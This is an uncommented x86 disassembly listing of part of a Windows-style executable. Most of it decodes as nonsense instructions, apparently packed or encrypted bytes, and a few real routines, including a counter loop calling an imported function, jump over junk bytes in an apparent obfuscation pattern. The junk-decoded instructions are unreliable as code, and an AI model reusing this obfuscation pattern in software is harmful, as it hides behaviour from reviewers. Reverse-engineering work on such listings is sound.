  405107:	test   ah,0xc8
  40510a:	add    dh,BYTE PTR [ebx]
  40510c:	data16 shr BYTE PTR ds:0xae8e8d24,1
  405113:	cld    
  405114:	pop    ds
  405115:	jmp    DWORD PTR [ecx+0xc]
  405118:	(bad)  
  405119:	loope  0x405167
  40511b:	jns    0x4050ff
  40511d:	cmp    eax,0xbbaa975
  405122:	mov    ebx,0x1e4ca254
  405127:	fwait
  405128:	int    0x4c
  40512a:	jecxz  0x4050ed
  40512c:	jno    0x40518f
  40512e:	repnz lods eax,DWORD PTR ds:[esi]
  405130:	outs   dx,BYTE PTR ds:[esi]
  405131:	jecxz  0x405190
  405133:	scas   al,BYTE PTR es:[edi]
  405134:	js     0x405175
  405136:	jp     0x405190
  405138:	test   al,0x23
  40513a:	xor    ebp,0xffffffd6
  40513d:	pushf  
  40513e:	popa   
  40513f:	jg     0x405104
  405141:	and    BYTE PTR [edx+0x4420900],bl
  405147:	popa   
  405148:	xchg   ebx,eax
  405149:	sti    
  40514a:	ins    BYTE PTR es:[edi],dx
  40514b:	xor    ebx,DWORD PTR [edx+0xfa83f22]
  405151:	fucomp st(2)
  405153:	xor    eax,0x6ff02163
  405158:	mov    ch,0x49
  40515a:	fmul   QWORD PTR [esi+0x68]
  40515d:	pop    ecx
  40515e:	xor    BYTE PTR es:[ecx-0x344fc04d],0x5c
  405166:	pop    esp
  405167:	inc    ebx
  405168:	addr16 cli 
  40516a:	jae    0x40518a
  40516c:	mov    ebp,0xf94f5f68
  405171:	add    al,0xb
  405173:	pop    es
  405174:	dec    esp
  405175:	pop    edi
  405176:	jnp    0x405183
  405178:	addr16 sbb ebx,ecx
  40517b:	out    dx,eax
  40517c:	mov    ecx,0xd30ed931
  405181:	pop    esi
  405182:	dec    edx
  405183:	sar    BYTE PTR [edi+0x663ed3f3],0xc5
  40518a:	jne    0x405207
  40518c:	jmp    0xeb0c:0x8171347c
  405193:	xchg   ah,ch
  405195:	sub    ebp,DWORD PTR ds:0x66eafbd5
  40519b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40519c:	fidivr WORD PTR [eax-0x69a7c0db]
  4051a2:	scas   al,BYTE PTR es:[edi]
  4051a3:	mov    esi,0x966657da
  4051a8:	xchg   DWORD PTR [ebx],esi
  4051aa:	inc    edx
  4051ab:	pop    edx
  4051ac:	inc    ebx
  4051ad:	mov    ds:0xd63a2706,al
  4051b2:	push   esi
  4051b3:	call   0x386d3062
  4051b8:	(bad)  
  4051b9:	je     0x4051c2
  4051bb:	jno    0x4051d3
  4051bd:	pop    esi
  4051be:	xor    BYTE PTR [ebx],dl
  4051c0:	mov    esi,0x2287c9e4
  4051c5:	lahf   
  4051c6:	addr16 jbe 0x4051d6
  4051c9:	into   
  4051ca:	(bad)  
  4051cb:	pop    ebx
  4051cc:	sbb    ch,dl
  4051ce:	cld    
  4051cf:	dec    esp
  4051d0:	das    
  4051d1:	pop    ebp
  4051d2:	push   cs
  4051d3:	adc    DWORD PTR [esi],0xffffff81
  4051d6:	in     al,0x95
  4051d8:	sbb    eax,0x973f85a9
  4051dd:	adc    al,0x7c
  4051df:	lock icebp 
  4051e1:	sbb    DWORD PTR [ecx+edx*8-0x241e49ed],esi
  4051e8:	leave  
  4051e9:	jae    0x4051c8
  4051eb:	pusha  
  4051ec:	xlat   BYTE PTR ds:[ebx]
  4051ed:	arpl   WORD PTR [eax+0x46],ax
  4051f0:	retf   0x6ca3
  4051f3:	sahf   
  4051f4:	jnp    0x4051d0
  4051f6:	in     eax,dx
  4051f7:	ret    0x23a0
  4051fa:	rol    BYTE PTR [esi],cl
  4051fc:	jg     0x40526b
  4051fe:	pushf  
  4051ff:	sti    
  405200:	cs dec esp
  405202:	dec    eax
  405203:	ror    DWORD PTR [ebp+0x729a1084],1
  405209:	xor    al,BYTE PTR [eax]
  40520b:	mov    DWORD PTR [ebp+0x8],eax
  40520e:	inc    DWORD PTR [ebp+0xc]
  405211:	jmp    0x404c37
  405216:	mov    eax,DWORD PTR [ebp-0x10]
  405219:	xor    eax,ecx
  40521b:	mov    ecx,DWORD PTR [ebp+0x10]
  40521e:	add    eax,esi
  405220:	mov    DWORD PTR [ecx],eax
  405222:	pop    esi
  405223:	leave  
  405224:	ret    0xc
  405227:	push   ebp
  405228:	mov    ebp,esp
  40522a:	jmp    0x4055fe
  40522f:	or     DWORD PTR ds:0x369d361d,0xffffffa3
  405236:	mov    ebp,0x424146fc
  40523b:	push   0x1c
  40523d:	(bad)  
  40523e:	mov    ch,0xd0
  405240:	sub    bh,BYTE PTR [esp+edi*2-0x4b]
  405244:	jns    0x4052c2
  405246:	jl     0x405275
  405248:	out    dx,al
  405249:	lds    ebx,FWORD PTR [ecx]
  40524b:	xor    al,0x5d
  40524d:	fucomp st(7)
  40524f:	sbb    esi,esp
  405251:	in     al,dx
  405252:	inc    esp
  405253:	lods   al,BYTE PTR ds:[esi]
  405254:	or     dh,bh
  405256:	inc    ebx
  405257:	pop    ds
  405258:	data16 or ch,BYTE PTR [edi+edi*2+0x25]
  40525d:	je     0x405222
  40525f:	add    BYTE PTR [ebp+0x71bf666b],0xf5
  405266:	push   ecx
  405267:	jb     0x405280
  405269:	pop    es
  40526a:	cmp    cl,BYTE PTR [ebx]
  40526c:	cmp    dh,BYTE PTR [ebx-0xfd9b502]
  405272:	pop    ecx
  405273:	add    eax,0x5ad02dcd
  405278:	icebp  
  405279:	sub    BYTE PTR [ebp-0xc],cl
  40527c:	dec    edx
  40527d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40527e:	pop    eax
  40527f:	in     al,dx
  405280:	pop    ebx
  405281:	xchg   edx,eax
  405282:	xchg   ebx,eax
  405283:	out    0xd1,al
  405285:	mov    WORD PTR [ecx-0x2f39cded],cs
  40528b:	aam    0x32
  40528d:	imul   ebx,DWORD PTR ds:0x9dbec444,0xac203d8f
  405297:	cli    
  405298:	mov    ecx,0x740957a3
  40529d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40529e:	adc    eax,0xc56e821e
  4052a3:	pop    edx
  4052a4:	aam    0xa1
  4052a6:	cmp    eax,0xbdc62778
  4052ab:	rol    edx,cl
  4052ad:	and    DWORD PTR [eax+0x39],esi
  4052b0:	cmp    ebp,esi
  4052b2:	cmp    BYTE PTR [ebx],al
  4052b4:	jnp    0x405278
  4052b6:	ret    0xe45e
  4052b9:	jnp    0x4052ec
  4052bb:	adc    DWORD PTR [eax+0x77],eax
  4052be:	mov    eax,0x9064892d
  4052c3:	adc    ebp,DWORD PTR [edi+0x1e]
  4052c6:	pop    edx
  4052c7:	ins    DWORD PTR es:[edi],dx
  4052c8:	or     eax,0xaa34ec7a
  4052cd:	inc    edi
  4052ce:	js     0x405258
  4052d0:	imul   ah
  4052d2:	add    BYTE PTR [ebp+0x6e],dh
  4052d5:	mul    BYTE PTR [esi]
  4052d7:	call   0x4c91:0xd13a980f
  4052de:	xor    ax,0x903
  4052e2:	jne    0x405334
  4052e4:	or     BYTE PTR [ebx-0x15b3cfaa],dl
  4052ea:	inc    ebx
  4052eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ec:	dec    ebx
  4052ed:	neg    dh
  4052ef:	cwde   
  4052f0:	xor    bl,BYTE PTR [esi]
  4052f2:	cmp    esi,ebp
  4052f4:	(bad)  
  4052f6:	mov    esi,0x5aab6c34
  4052fb:	sar    BYTE PTR ds:0x51fb341b,cl
  405301:	mov    cs,WORD PTR [ebx+edx*4]
  405304:	jne    0x405359
  405306:	out    dx,eax
  405307:	xor    eax,0xc538b582
  40530c:	pop    ecx
  40530d:	pop    ds
  40530e:	fstp   QWORD PTR [edi+eiz*1+0x4f096bda]
  405315:	add    eax,0xf4adec46
  40531a:	div    DWORD PTR [ecx-0x3a]
  40531d:	sub    al,0x92
  40531f:	int3   
  405320:	cmp    al,0xe6
  405322:	dec    edx
  405323:	xchg   ebx,eax
  405324:	nop
  405325:	fmul   DWORD PTR [edi+0x7daf9b03]
  40532b:	pop    ss
  40532c:	xchg   esi,eax
  40532d:	shr    DWORD PTR [ebp+0x24],cl
  405330:	push   0x9
  405332:	sbb    eax,0x7757194d
  405337:	cmc    
  405338:	cmp    ecx,DWORD PTR [esi]
  40533a:	mov    bh,BYTE PTR [esi-0x5e8f77bf]
  405340:	xor    BYTE PTR [ebx-0x76],bl
  405343:	jp     0x40535d
  405345:	ret    0xa9a7
  405348:	xchg   edi,eax
  405349:	ss xchg esi,eax
  40534b:	adc    al,0xb6
  40534d:	int3   
  40534e:	mov    ecx,0x5847cdec
  405353:	sub    esp,DWORD PTR [ecx-0x12b7f655]
  405359:	shl    al,1
  40535b:	fidivr DWORD PTR [eax]
  40535d:	adc    DWORD PTR [edi+0x44],0x1190609d
  405364:	jmp    0xd7a0:0xb3de2db6
  40536b:	fs loope 0x4052fe
  40536e:	sub    al,0x57
  405370:	bound  edx,QWORD PTR [ebx+ebp*8-0x78]
  405374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405375:	std    
  405376:	xor    ebx,DWORD PTR [esi]
  405378:	repz test eax,0x4da3da71
  40537f:	push   0x4d
  405381:	pop    es
  405382:	call   0x1d8f6e0b
  405387:	scas   eax,DWORD PTR es:[edi]
  405388:	pop    ds
  405389:	pop    ss
  40538a:	neg    DWORD PTR [si+0x6990]
  40538f:	dec    esp
  405390:	ret    
  405391:	pop    edx
  405392:	pop    edi
  405393:	pop    ss
  405394:	in     al,dx
  405395:	iret   
  405396:	dec    ebx
  405398:	mov    eax,ds:0xa9377f0a
  40539d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40539e:	sub    al,BYTE PTR [ecx-0x6f]
  4053a1:	adc    DWORD PTR [ebp-0x16],ebx
  4053a4:	mov    ebx,0xcd84a430
  4053a9:	xor    al,0xed
  4053ab:	stc    
  4053ac:	mov    WORD PTR [ecx],cs
  4053ae:	mov    edi,0xa6a7acd5
  4053b3:	mov    ecx,0x4b49b147
  4053b8:	fld    TBYTE PTR [ebp+0x4a]
  4053bb:	and    bl,dh
  4053bd:	pop    esp
  4053be:	mov    ch,0x30
  4053c0:	setbe  BYTE PTR [edi+0x66fc4b49]
  4053c7:	push   ss
  4053c8:	mov    esp,0xba24a8ea
  4053cd:	mov    es,WORD PTR [esp+ecx*1-0x1099000a]
  4053d4:	inc    ebx
  4053d5:	cmp    ah,BYTE PTR [eax]
  4053d7:	cld    
  4053d8:	js     0x405452
  4053da:	std    
  4053db:	in     eax,dx
  4053dc:	dec    edx
  4053dd:	fld    TBYTE PTR [ebp-0x6d]
  4053e0:	vpcmpeqd xmm7,xmm2,XMMWORD PTR [ebx]
  4053e4:	and    ebp,DWORD PTR [edx]
  4053e6:	not    DWORD PTR [edx]
  4053e8:	mov    DWORD PTR [edx],ebx
  4053ea:	xor    ebp,DWORD PTR [esi-0x54]
  4053ed:	adc    BYTE PTR [ebp+0x2e],ch
  4053f0:	xor    ebp,DWORD PTR [esi+ecx*2]
  4053f3:	adc    ch,ch
  4053f5:	dec    esp
  4053f6:	aad    0xda
  4053f8:	lock sbb eax,0xf731c1fc
  4053fe:	xor    cl,0xa0
  405401:	xchg   edx,eax
  405402:	pop    edi
  405403:	out    dx,eax
  405404:	adc    DWORD PTR [ecx+0x3f660db9],edi
  40540a:	or     DWORD PTR [ebx+0x2d],edi
  40540d:	cmp    eax,esp
  40540f:	imul   edx,DWORD PTR [ebp+esi*1-0x3b],0x75d7c3ca
  405417:	inc    DWORD PTR [eax]
  405419:	popa   
  40541a:	and    DWORD PTR [esp+esi*1+0x3fe788ca],0x6eb40ef7
  405425:	push   edi
  405426:	lea    eax,[edx]
  405428:	xlat   BYTE PTR ds:[ebx]
  405429:	es test al,0x10
  40542c:	(bad)  
  40542d:	jmp    0xa93f4336
  405432:	into   
  405433:	mov    eax,0x66a59eee
  405438:	xlat   BYTE PTR ds:[ebx]
  405439:	jmp    0x40547a
  40543b:	ds retf 
  40543d:	aas    
  40543e:	mov    dh,0x85
  405440:	mov    ebp,0x2158328f
  405445:	enter  0x10b,0x8f
  405449:	(bad)  
  40544a:	pop    ds
  40544b:	dec    ebx
  40544c:	xchg   ecx,eax
  40544d:	jle    0x4053de
  40544f:	int3   
  405450:	pop    ebx
  405451:	fwait
  405452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405453:	idiv   BYTE PTR [esi+0x7892d665]
  405459:	imul   ebp,DWORD PTR [ecx],0xffffff9d
  40545c:	and    ebp,DWORD PTR [edi-0x4a01977a]
  405462:	outs   dx,BYTE PTR ds:[esi]
  405463:	xor    ebp,eax
  405465:	in     eax,0x90
  405467:	fstp   QWORD PTR [edi]
  405469:	pop    ebp
  40546a:	dec    esi
  40546b:	sbb    esp,DWORD PTR [ecx+0x59]
  40546e:	sbb    DWORD PTR [ecx-0x7f84ca61],edi
  405474:	mov    ds:0x85619440,al
  405479:	sub    al,0x2b
  40547b:	into   
  40547c:	sub    bh,al
  40547e:	loope  0x4054e6
  405480:	leave  
  405481:	push   ss
  405482:	inc    edi
  405483:	outs   dx,DWORD PTR ds:[esi]
  405484:	out    0x4a,al
  405486:	iret   
  405487:	sbb    al,0xa2
  405489:	xor    BYTE PTR [esi],bl
  40548b:	stos   BYTE PTR es:[edi],al
  40548c:	push   esp
  40548d:	mov    bl,0x48
  40548f:	mov    bl,0x47
  405491:	jb     0x405503
  405493:	sub    ah,BYTE PTR [ebp+eax*1-0x7]
  405497:	in     eax,dx
  405498:	sub    ecx,esp
  40549a:	(bad)  
  40549b:	je     0x405438
  40549d:	test   WORD PTR [esi-0x1f],si
  4054a1:	cmp    al,0x3
  4054a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054a4:	cmp    BYTE PTR [ecx*8-0x2fa34863],0x7f
  4054ac:	mul    bh
  4054ae:	sub    eax,0x4c041ae3
  4054b3:	pop    DWORD PTR [edx+0x30926342]
  4054b9:	cmp    ebx,DWORD PTR [eax]
  4054bb:	mov    edx,0xd5ac332b
  4054c0:	jns    0x40547e
  4054c2:	jmp    0xae4a:0x893bf11
  4054c9:	inc    edi
  4054ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054cb:	(bad)  
  4054cc:	outs   dx,DWORD PTR ds:[esi]
  4054cd:	mov    cl,0x24
  4054cf:	jns    0x405468
  4054d1:	push   0x86ad2aae
  4054d6:	xor    bl,BYTE PTR [ecx+0x7a]
  4054d9:	out    0x8e,al
  4054db:	cmp    al,0x8d
  4054dd:	xor    eax,0xb42e7388
  4054e2:	or     al,0x16
  4054e4:	mov    dh,0xc5
  4054e6:	lahf   
  4054e7:	test   bh,cl
  4054e9:	call   0xc67b5d5c
  4054ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054ef:	mov    ebp,0xc3161250
  4054f4:	jmp    0x5678:0xd560896c
  4054fb:	in     al,dx
  4054fc:	test   eax,0x5d2ae531
  405501:	cmp    dh,BYTE PTR [ebx+0x6eaf1134]
  405507:	addr16 jb 0x40557f
  40550a:	pop    eax
  40550b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40550c:	and    al,0x79
  40550e:	test   al,0x64
  405510:	adc    ah,BYTE PTR [edi+0x7747b7e2]
  405516:	test   eax,0xfc0796fe
  40551b:	xchg   ebx,eax
  40551c:	adc    eax,0x2a9be88a
  405521:	shl    BYTE PTR [esi],1
  405523:	jb     0x40552f
  405525:	add    eax,0x3c1f4733
  40552a:	xor    edx,DWORD PTR [eax]
  40552c:	inc    edx
  40552d:	cmc    
  40552e:	mov    dh,0x6f
  405530:	cdq    
  405531:	sar    BYTE PTR [esi-0x7bd9c0b3],1
  405537:	pop    ds
  405538:	in     eax,dx
  405539:	enter  0xd63c,0x2a
  40553d:	stc    
  40553e:	adc    ah,al
  405540:	repz daa 
  405542:	mov    bh,0xef
  405544:	or     DWORD PTR [eax],ebx
  405546:	fld    QWORD PTR [edi-0x65]
  405549:	or     bl,BYTE PTR [edi+0x6d]
  40554c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40554d:	xchg   ecx,eax
  40554e:	adc    BYTE PTR [edx-0x1a],bh
  405551:	dec    ebx
  405552:	mov    ds:0xa115491,al
  405557:	or     DWORD PTR [edx-0x7c],edi
  40555a:	(bad)  
  40555c:	sti    
  40555d:	ins    DWORD PTR es:[edi],dx
  40555e:	lods   al,BYTE PTR ds:[esi]
  40555f:	jb     0x4055b8
  405561:	xchg   esi,eax
  405562:	imul   ebx,DWORD PTR [esi+0x59f19152],0xffffff8b
  405569:	(bad)  
  40556a:	jmp    0xcb7a:0xfa3abb23
  405571:	dec    ebx
  405572:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  405574:	jmp    0x93c42a34
  405579:	inc    edi
  40557a:	iret   
  40557b:	(bad)  
  40557c:	fiadd  WORD PTR [edx+0x52]
  40557f:	sti    
  405580:	es push edx
  405582:	daa    
  405583:	adc    bl,dl
  405585:	dec    edx
  405586:	or     DWORD PTR [ebx],ebx
  405588:	ins    BYTE PTR es:[edi],dx
  405589:	fisttp WORD PTR [eax+0x1ddbd552]
  40558f:	jp     0x4055f9
  405591:	aas    
  405592:	inc    eax
  405593:	xchg   edx,eax
  405594:	xor    esi,DWORD PTR [ebp-0x55ced619]
  40559a:	sbb    DWORD PTR [ecx],edx
  40559c:	std    
  40559d:	arpl   cx,ax
  40559f:	mov    cl,0x15
  4055a1:	aad    0x74
  4055a3:	scas   al,BYTE PTR es:[edi]
  4055a4:	and    al,0xba
  4055a6:	sbb    DWORD PTR [edx],0xb0d6a6e6
  4055ac:	daa    
  4055ad:	mov    bh,0xa4
  4055af:	push   es
  4055b0:	sbb    eax,0x800b3b7e
  4055b5:	and    ecx,ebp
  4055b7:	in     eax,0x6f
  4055b9:	aas    
  4055ba:	inc    edx
  4055bb:	jmp    0xc5d0:0x69a8b631
  4055c2:	int    0x81
  4055c4:	into   
  4055c5:	clc    
  4055c6:	inc    ecx
  4055c7:	push   0xfffffffc
  4055c9:	mov    dh,0x7f
  4055cb:	(bad)  
  4055cc:	jle    0x4055ad
  4055ce:	adc    BYTE PTR [ecx-0x862c410],0x80
  4055d5:	push   0xffffffd8
  4055d7:	sti    
  4055d8:	rcl    edx,0xdd
  4055db:	xchg   esp,eax
  4055dc:	jmp    0xf2e7:0x723c0973
  4055e3:	pop    es
  4055e4:	ds gs ret 0x1d48
  4055e9:	in     eax,0x2a
  4055eb:	pushf  
  4055ec:	xchg   edi,eax
  4055ee:	fst    st(7)
  4055f0:	fisub  DWORD PTR [esi]
  4055f2:	cmp    eax,0x10f7b3f0
  4055f7:	hlt    
  4055f8:	sub    BYTE PTR [eax],ah
  4055fa:	sub    BYTE PTR [bx+di],ah
  4055fd:	inc    esp
  4055fe:	push   ecx
  4055ff:	push   ecx
  405600:	and    DWORD PTR ds:0x433563,0x0
  40560a:	mov    eax,ds:0x433563
  40560f:	inc    eax
  405610:	mov    ds:0x433563,eax
  405615:	cmp    DWORD PTR ds:0x433563,0x4
  40561c:	jne    0x405630
  405622:	push   0x6994
  405627:	push   DWORD PTR [ebp-0xc]
  40562a:	call   DWORD PTR ds:0x412254
  405630:	cmp    DWORD PTR ds:0x433563,0x3
  405637:	jne    0x405648
  40563d:	mov    eax,ds:0x433563
  405642:	inc    eax
  405643:	mov    ds:0x433563,eax
  405648:	cmp    DWORD PTR ds:0x433563,0x12
  40564f:	jb     0x40560a
  405655:	sbb    edx,ecx
  405657:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40565e:	jmp    0x405a32
  405663:	xchg   ecx,eax
  405664:	dec    ebx
  405665:	xor    eax,0xbd71fd91
  40566a:	dec    ebx
  40566b:	rcl    DWORD PTR [esi+0x1d],1
  40566e:	push   esi
  40566f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405670:	and    BYTE PTR [edi+0xd],0x9
  405674:	ss jl  0x4056f3
  405677:	mov    ch,0x79
  405679:	jl     0x4056f7
  40567b:	out    dx,eax
  40567c:	inc    edx
  40567d:	mov    DWORD PTR [edi-0x27c4e8f1],eax
  405683:	xchg   DWORD PTR [eax+edi*2],ebp
  405686:	(bad)  
  405687:	aas    
  405688:	mov    DWORD PTR ds:0x44079e7e,edi
  40568e:	jb     0x405672
  405690:	loopne 0x40570d
  405692:	push   0x56767bd9
  405697:	ins    DWORD PTR es:[edi],dx
  405698:	push   cs
  405699:	ja     0x405685
  40569b:	mov    eax,0xbbd1e32
  4056a0:	or     esi,eax
  4056a2:	das    
  4056a3:	aaa    
  4056a4:	sub    BYTE PTR [ebx],al
  4056a6:	scas   eax,DWORD PTR es:[edi]
  4056a7:	or     DWORD PTR [ebx+edi*2],ebx
  4056aa:	int    0x2a
  4056ac:	pop    ebp
  4056ad:	leave  
  4056ae:	les    eax,FWORD PTR [ebp+0x56276ba6]
  4056b4:	inc    esi
  4056b5:	test   eax,0xfb868e21
  4056ba:	mul    dl
  4056bc:	lds    ecx,FWORD PTR [edx+0x8]
  4056bf:	outs   dx,BYTE PTR ds:[esi]
  4056c0:	xlat   BYTE PTR ds:[ebx]
  4056c1:	rcr    cl,1
  4056c3:	or     al,0x8f
  4056c5:	mov    esp,0x96af35a1
  4056ca:	icebp  
  4056cb:	rcr    DWORD PTR [esi],0xd6
  4056ce:	ds mul ecx
  4056d1:	test   BYTE PTR [ebx-0x3d],dh
  4056d4:	sbb    BYTE PTR [ecx*1-0x5be691df],dl
  4056db:	or     al,BYTE PTR [ebp+eax*4+0xf34fa5a]
  4056e2:	dec    esp
  4056e3:	test   eax,0x450d758c
  4056e8:	adc    BYTE PTR [edx],dh
  4056ea:	mov    edi,0xb82cc783
  4056ef:	xor    al,0x6e
  4056f1:	xchg   edi,eax
  4056f2:	and    eax,0x395fa5af
  4056f7:	(bad)  
  4056f8:	std    
  4056f9:	daa    
  4056fa:	enter  0xb291,0xe7
  4056fe:	pop    ebp
  4056ff:	mov    cl,0x68
  405701:	ins    BYTE PTR es:[edi],dx
  405702:	retf   0xa1b0
  405705:	repnz pusha 
  405707:	arpl   WORD PTR [esi-0x31e7470a],si
  40570d:	push   eax
  40570e:	(bad)  
  40570f:	fadd   QWORD PTR [esi]
  405711:	adc    eax,0xb2f07764
  405716:	lods   al,BYTE PTR ds:[esi]
  405717:	sub    bh,BYTE PTR [ebp+0x3df49c47]
  40571d:	or     BYTE PTR [edi+edx*1+0x3a7665b3],dh
  405724:	cmp    BYTE PTR [eax+eax*4+0x7f],ah
  405728:	popf   
  405729:	call   0xaa26:0x3721ede0
  405730:	in     eax,0xf
  405732:	inc    esi
  405733:	pop    esp
  405734:	pusha  
  405735:	jp     0x405737
  405737:	icebp  
  405738:	sti    
  405739:	add    bl,dh
  40573b:	call   0xe732:0xf9593a53
  405742:	enter  0x985,0xb
  405746:	and    ebx,DWORD PTR [esi+esi*1-0x17]
  40574a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40574b:	xchg   esi,eax
  40574c:	int    0x66
  40574e:	jno    0x405790
  405750:	jmp    0x660e:0xfd9f195b
  405757:	pop    es
  405758:	in     eax,0x21
  40575a:	lods   al,BYTE PTR ds:[esi]
  40575b:	ja     0x405752
  40575d:	leave  
  40575e:	int    0xb6
  405760:	jl     0x4057da
  405762:	jge    0x4057d1
  405764:	pop    ecx
  405765:	jnp    0x4056e8
  405767:	out    dx,al
  405768:	pop    ss
  405769:	(bad)  
  40576b:	mov    BYTE PTR [ebx+esi*1-0x67],ch
  40576f:	pop    ecx
  405770:	mov    dh,0x76
  405772:	add    DWORD PTR [edx+0x47],ecx
  405775:	xlat   BYTE PTR ds:[ebx]
  405776:	xchg   edx,eax
  405777:	mov    eax,0x1daca98a
  40577c:	jo     0x405799
  40577e:	hlt    
  40577f:	mov    esi,0x991a9575
  405784:	jbe    0x405779
  405786:	adc    esp,esp
  405788:	xchg   edx,eax
  405789:	ror    BYTE PTR [edx-0x78],0xd1
  40578d:	mov    BYTE PTR [ecx+0x416cd5c7],dl
  405793:	call   0x31cacd8f
  405798:	and    cl,bl
  40579a:	dec    ebx
  40579b:	iret   
  40579c:	and    al,BYTE PTR [edx+0x9]
  40579f:	jne    0x405768
  4057a1:	push   eax
  4057a2:	mov    fs,WORD PTR [eax-0x1bff6e54]
  4057a8:	aad    0xb1
  4057aa:	push   ebx
  4057ab:	stc    
  4057ac:	mov    bh,0x48
  4057ae:	jno    0x40574d
  4057b0:	mov    cl,0x5f
  4057b2:	sub    dh,BYTE PTR [edi]
  4057b4:	jne    0x405798
  4057b6:	ja     0x4057cd
  4057b8:	bound  ebx,QWORD PTR [ebx]
  4057ba:	add    ebx,eax
  4057bc:	(bad)  
  4057bd:	mov    bl,0x19
  4057bf:	sub    DWORD PTR ds:0xd931e649,edx
  4057c5:	cmp    BYTE PTR [ebx],dh
  4057c7:	push   0xfffffffd
  4057c9:	stos   DWORD PTR es:[edi],eax
  4057ca:	gs into 
  4057cc:	data16 test al,0xda
  4057cf:	fdiv   QWORD PTR [esi+0x11ecaecd]
  4057d5:	adc    dl,BYTE PTR [bx+di+0x31]
  4057d9:	(bad)  
  4057da:	jg     0x4057dc
  4057dc:	scas   al,BYTE PTR es:[edi]
  4057dd:	popa   
  4057de:	mov    edi,0x4b7c9c57
  4057e3:	mov    dh,0xe0
  4057e5:	div    BYTE PTR [ecx+0xdb76b9b]
  4057eb:	fs nop
  4057ed:	pop    ebp
  4057ee:	pop    esp
  4057ef:	(bad)  
  4057f1:	push   es
  4057f2:	mov    edx,0x26091dfc
  4057f7:	popa   
  4057f8:	sbb    BYTE PTR [ecx+eiz*1+0x3e],ah
  4057fc:	dec    esi
  4057fd:	lods   eax,DWORD PTR ds:[esi]
  4057fe:	je     0x405860
  405800:	repnz mov ecx,0xd84ba36d
  405806:	cld    
  405807:	mov    dh,BYTE PTR [ecx+0x4e]
  40580a:	aaa    
  40580b:	daa    
  40580c:	fs pusha 
  40580e:	pop    ebp
  40580f:	mov    dl,0x52
  405811:	mov    ds:0x82a07b04,al
  405816:	cmp    al,0x6e
  405818:	mul    DWORD PTR [ebp+0x292dbe77]
  40581e:	arpl   WORD PTR [eax+0x252c4c2f],dx
  405824:	out    dx,al
  405825:	mov    ecx,0xb2710cc0
  40582a:	push   ebx
  40582b:	mov    ecx,0x6c5a40c8
  405830:	add    BYTE PTR [ecx-0x1b],ch
  405833:	mov    ah,0x29
  405835:	cwde   
  405836:	push   eax
  405837:	xor    eax,0x150f4c59
  40583c:	rcl    DWORD PTR [ebp-0x10],0xf6
  405840:	cmp    BYTE PTR [edi+0x3acfa2b7],0x22
  405847:	stos   DWORD PTR es:[edi],eax
  405848:	fstp   QWORD PTR [esi-0x61a9de09]
  40584e:	push   es
  40584f:	nop
  405850:	adc    DWORD PTR [eax+0x450f2427],esp
  405856:	adc    DWORD PTR [ebp-0x17],ebx
  405859:	neg    DWORD PTR [ebp-0x2ff02e48]
  40585f:	mov    DWORD PTR [eax],ecx
  405861:	addr16 mov cx,0x6a56
  405866:	xchg   edx,eax
  405867:	out    0x80,al
  405869:	jge    0x4057ff
  40586b:	aas    
  40586c:	(bad)  
  40586d:	adc    edi,DWORD PTR [edi-0x25]
  405870:	mov    bl,BYTE PTR [ebx-0x5025df9c]
  405876:	adc    BYTE PTR [eax-0x2c3d607a],bl
  40587c:	cmp    BYTE PTR [ecx+ebp*8+0x37],cl
  405880:	out    dx,al
  405881:	sub    DWORD PTR [ebp+0x3af481b7],0x2069cbf7
  40588b:	or     al,0x9a
  40588d:	jecxz  0x4058ef
  40588f:	cdq    
  405890:	(bad)
  405894:	jg     0x4058f8
  405896:	ror    ch,0x23
  405899:	test   BYTE PTR [edi+0x38],cl
  40589c:	sub    BYTE PTR [esi-0x20],bl
  40589f:	mov    ds,WORD PTR [ebp+0x216fd017]
  4058a5:	das    
  4058a6:	dec    esp
  4058a7:	push   ecx
  4058a8:	push   ss
  4058a9:	lock loop 0x4058e4
  4058ac:	mov    esp,0x1a1ce75a
  4058b1:	in     al,dx
  4058b2:	(bad)  
  4058b3:	pop    edx
  4058b4:	sbb    al,0x19
  4058b6:	jl     0x405867
  4058b8:	mov    al,0x2
  4058ba:	inc    ecx
  4058bb:	data16 lahf 
  4058bd:	cli    
  4058be:	xchg   esi,eax
  4058bf:	xchg   BYTE PTR [edx+edx*2-0x4b],dh
  4058c3:	dec    edx
  4058c4:	xchg   edi,eax
  4058c5:	inc    edx
  4058c6:	jmp    0xf8dc:0x87a19330
  4058cd:	popf   
  4058ce:	cdq    
  4058cf:	add    eax,0x4d33ddf0
  4058d4:	adc    DWORD PTR [esi],esi
  4058d6:	out    0xe5,eax
  4058d8:	cs int3 
  4058da:	ja     0x405861
  4058dc:	pop    esi
  4058dd:	and    DWORD PTR [ebx+ebx*8+0x2d8fb53f],0x4f428278
  4058e8:	stos   DWORD PTR es:[edi],eax
  4058e9:	retf   0x7245
  4058ec:	(bad)  
  4058ee:	push   es
  4058ef:	int3   
  4058f0:	lahf   
  4058f1:	push   cs
  4058f2:	add    bl,ch
  4058f4:	xor    dh,BYTE PTR [ebx+0x56eebb9f]
  4058fa:	mov    eax,0xcd3279c4
  4058ff:	jmp    0xe315:0xaf64580f
  405906:	jg     0x405920
  405908:	inc    esi
  405909:	pop    ebp
  40590a:	popf   
  40590b:	mov    eax,edx
  40590d:	and    cl,BYTE PTR [ebp+0x47ce233d]
  405913:	scas   eax,DWORD PTR es:[edi]
  405914:	aas    
  405915:	test   al,0x2f
  405917:	xchg   ebp,eax
  405918:	daa    
  405919:	dec    ebx
  40591a:	cmc    
  40591b:	xchg   ebp,eax
  40591c:	outs   dx,BYTE PTR ds:[esi]
